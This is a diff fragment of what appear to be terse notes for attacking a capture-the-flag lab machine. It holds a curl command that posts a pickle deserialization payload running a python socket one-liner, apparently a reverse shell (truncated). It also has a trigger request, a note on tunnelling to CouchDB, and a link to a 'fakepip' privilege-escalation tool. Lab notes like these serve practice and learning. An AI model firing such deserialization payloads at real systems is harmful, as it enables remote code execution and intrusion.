@@ -3,5 +3,7 @@ curl -X POST --data "character=cposix%0Asystem%0Ap1%0A(S'python -c \'import sock
 
 curl -X POST --data id=payloadHash http://10.10.10.70/check
 
+ssh tunel to access courchDB ui 
+
 #root
 https://github.com/0x00-0x00/fakepip
